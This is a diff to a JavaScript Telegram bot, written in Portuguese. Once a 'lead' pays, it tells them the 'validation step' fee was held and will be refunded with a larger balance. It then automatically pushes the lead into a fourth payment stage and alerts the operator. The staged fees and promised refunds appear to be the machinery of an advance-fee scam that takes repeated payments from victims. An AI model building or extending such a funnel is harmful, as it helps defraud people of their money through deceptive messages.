@@ -613,8 +613,13 @@ async function startTelegramPolling() {
 
             if (status === "PAID" || status === "confirmed" || status === "SUCESSO") {
               const successMsg = `✅ *PARABÉNS! ETAPA DE VALIDAÇÃO CONCLUÍDA* ✅\n\nO valor de *R$ ${parseFloat(valor).toFixed(2)}* foi segurado e será reembolsado junto ao saldo total de *R$ ${parseFloat(total).toFixed(2)}* em instantes.`;
-              fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: phone, message: successMsg }));
-              await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\nLead: ${phone}`);
+              const ts = Date.now();
+              fs.writeFileSync(`cmd-send-${ts}.json`, JSON.stringify({ to: phone, message: successMsg }));
+              
+              // Gatilho automático para Etapa 4
+              fs.writeFileSync(`cmd-etapa-${ts + 2000}.json`, JSON.stringify({ etapa: 4, chatId: phone }));
+
+              await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\nLead: ${phone}\n\n✅ <i>Etapa 4 liberada automaticamente.</i>`);
             } else {
               await sendTelegram(`⏳ <b>AGUARDANDO:</b> O lead ainda não pagou.`);
             }
